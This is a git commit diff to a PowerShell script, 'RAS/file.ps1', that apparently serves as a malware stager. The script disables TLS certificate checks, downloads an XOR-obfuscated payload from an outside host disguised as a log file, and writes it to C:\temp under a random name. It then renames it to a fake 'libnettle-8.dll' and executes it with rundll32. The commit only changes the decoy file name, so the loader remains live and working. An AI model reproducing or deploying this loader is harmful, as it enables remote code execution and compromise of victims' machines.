76dddf592b29ac6f8e34fd0cc96852163b9fc6d9
Luca Marsilia <37773731+intel-xeon@users.noreply.github.com>
2026-02-11 11:08:29 +0100

    Update file.ps1

--- RAS/file.ps1
+++ RAS/file.ps1
@@ -3,7 +3,7 @@ $wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (W
 $k="alwiDasd";
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
 $i=0;[byte[]]$b=([byte[]]($wc.DownloadData("https://01.bas-cluster.com:443/public/events.log")))|%{$_-bxor$k[$i++%$k.length]};
-Add-Content -Path "C:\temp\resummoned-lavation.log" -Value $b -Encoding Byte;
+Add-Content -Path "C:\temp\fetishists-civilizers.log" -Value $b -Encoding Byte;
 if ( Test-Path -Path C:\temp\libnettle-8.dll ){ remove-Item -Path C:\temp\libnettle-8.dll -Force};
-Rename-Item C:\temp\resummoned-lavation.log C:\temp\libnettle-8.dll;
+Rename-Item C:\temp\fetishists-civilizers.log C:\temp\libnettle-8.dll;
 rundll32.exe C:\temp\libnettle-8.dll,WaitMe
